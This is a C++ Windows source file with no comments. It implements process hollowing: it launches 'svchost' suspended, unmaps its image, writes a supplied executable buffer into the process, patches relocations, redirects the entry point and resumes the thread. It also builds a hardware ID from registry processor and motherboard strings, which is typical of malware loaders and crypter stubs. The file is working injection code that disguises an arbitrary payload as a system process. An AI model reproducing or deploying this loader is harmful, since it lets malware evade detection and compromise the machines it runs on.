#include "stdafx.h"
#include "system.h"

DWORD FindRemotePEB(HANDLE hProcess)
{
	HMODULE hNTDLL = LoadLibraryA("ntdll");

	if (!hNTDLL)
		return 0;

	FARPROC fpNtQueryInformationProcess = GetProcAddress
		(
		hNTDLL,
		"NtQueryInformationProcess"
		);

	if (!fpNtQueryInformationProcess)
		return 0;

	_NtQueryInformationProcess ntQueryInformationProcess =
		(_NtQueryInformationProcess)fpNtQueryInformationProcess;

	PROCESS_BASIC_INFORMATION* pBasicInfo =
		new PROCESS_BASIC_INFORMATION();

	DWORD dwReturnLength = 0;

	ntQueryInformationProcess
		(
		hProcess,
		0,
		pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
		);

	return pBasicInfo->PebBaseAddress;
}

PEB* ReadRemotePEB(HANDLE hProcess)
{
	DWORD dwPEBAddress = FindRemotePEB(hProcess);

	PEB* pPEB = new PEB();

	BOOL bSuccess = ReadProcessMemory
		(
		hProcess,
		(LPCVOID)dwPEBAddress,
		pPEB,
		sizeof(PEB),
		0
		);

	if (!bSuccess)
		return 0;

	return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
	BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

	BOOL bSuccess = ReadProcessMemory
		(
		hProcess,
		lpImageBaseAddress,
		lpBuffer,
		BUFFER_SIZE,
		0
		);

	if (!bSuccess)
		return 0;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;

	PLOADED_IMAGE pImage = new LOADED_IMAGE();

	pImage->FileHeader =
		(PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);

	pImage->NumberOfSections =
		pImage->FileHeader->FileHeader.NumberOfSections;

	pImage->Sections =
		(PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew +
		sizeof(IMAGE_NT_HEADERS32));

	return pImage;
}

void ForkProcess(char *pBuffer)
{
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	CreateProcessA(0, "svchost", 0, 0, 0, CREATE_SUSPENDED,	0, 0, pStartupInfo,	pProcessInfo);

	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\n");
		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	HMODULE hNTDLL = GetModuleHandleA("ntdll");	

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	PVOID pRemoteImage = VirtualAllocEx(pProcessInfo->hProcess,	pPEB->ImageBaseAddress,	pSourceHeaders->OptionalHeader.SizeOfImage,	MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -	pSourceHeaders->OptionalHeader.ImageBase;

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	if (!WriteProcessMemory(pProcessInfo->hProcess,	pPEB->ImageBaseAddress,	pBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0))
	{
		printf("Error writing process memory #1\r\n");
		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =	(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory(pProcessInfo->hProcess,	pSectionDestination, &pBuffer[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData,	0))
		{
			printf("Error writing process memory #2\r\n");
			return;
		}
	}

	if (dwDelta)
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		char* pSectionName = ".reloc";

		if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
			continue;

		DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
		DWORD dwOffset = 0;

		IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		while (dwOffset < relocData.Size)
		{
			PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

			dwOffset += sizeof(BASE_RELOCATION_BLOCK);

			DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

			PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

			for (DWORD y = 0; y < dwEntryCount; y++)
			{
				dwOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (pBlocks[y].Type == 0)
					continue;

				DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

				DWORD dwBuffer = 0;
				ReadProcessMemory(pProcessInfo->hProcess, (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(DWORD), 0);
				dwBuffer += dwDelta;

				BOOL bSuccess = WriteProcessMemory(pProcessInfo->hProcess, (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),	&dwBuffer, sizeof(DWORD), 0);

				if (!bSuccess)
				{
					printf("Error writing memory\r\n");
					continue;
				}
			}
		}

		break;
	}


	DWORD dwBreakpoint = 0xCC;

	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error getting context\r\n");
		return;
	}

	pContext->Eax = dwEntrypoint;
	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error setting context\r\n");
		return;
	}

	if (!ResumeThread(pProcessInfo->hThread))
	{
		printf("Error resuming thread\r\n");
		return;
	}
}

char* GetProcessor()
{
	char  CPUkey[100] = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
	char  CPUVal[100] = "ProcessorNameString";
	HKEY key1;

	char* buf = (char*)malloc(100);

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, CPUkey, 0, KEY_READ, &key1) == ERROR_SUCCESS)
	{
		DWORD dataSize;

		RegQueryValueExA(key1, CPUVal, NULL, NULL, NULL, &dataSize);
		realloc(buf, dataSize);

		int result = RegQueryValueExA(key1, CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
	}

	RegCloseKey(key1);

	return buf;
}

char* GetMainBoard()
{
	char  CPUkey[100] = "HARDWARE\\DESCRIPTION\\System\\BIOS";
	char  CPUVal[100] = "BaseBoardProduct";
	HKEY key1;

	char* buf = (char*)malloc(100);

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, CPUkey, 0, KEY_READ, &key1) == ERROR_SUCCESS)
	{
		DWORD dataSize;

		RegQueryValueExA(key1, CPUVal, NULL, NULL, NULL, &dataSize);
		realloc(buf, dataSize);

		RegQueryValueExA(key1, CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
	}

	RegCloseKey(key1);

	return buf;
}

char* GetHWID()
{
	char *pOut = (char*)malloc(256);

	sprintf(pOut, "%s%s",
		GetMainBoard(),
		GetProcessor()
		);

	return pOut;
}
